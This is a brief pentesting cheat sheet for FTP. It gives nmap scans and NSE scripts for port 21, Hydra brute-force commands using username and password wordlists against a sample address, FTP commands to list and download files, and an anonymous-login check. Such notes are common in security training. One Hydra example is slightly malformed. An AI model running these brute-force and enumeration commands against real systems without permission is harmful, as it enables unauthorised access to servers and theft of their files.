
**Default Port:** 21

nmap -sC -p 21 IP/CIDR 
nmap -sC -sV -p 21 -v IP/CIDR 
nmap --script ftp* -p 21 -vvv IP/CIDR 

Connecting to a FTP Target
Example: ftp + ip (User and Password)

Brute Force FTP Target using Hydra
Example: hydra IP -L "Usernames Wordlist" -P "Passwords Wordlist"
Practical Example with lists:
hydra IP -L "/usr/share/wordlists/users.txt" -P "/usr/share/wordlists/passwords.txt" 192.168.1.10 ftp -V

Practical Example with user:
hydra -l test -P "/usr/share/wordlists/passwords.txt" 192.168.1.10 ftp -V


Copy all results to a file new file because we probably need this in the future

Command to list files after login to FTP: ls

Command to download files after login to FTP: get "file name"
File will be downloaded into current attacker's machine directory

#######################################

Anonymous check
ftp ftp://anonymous:anonymous@IP ADDRESS

#######################################

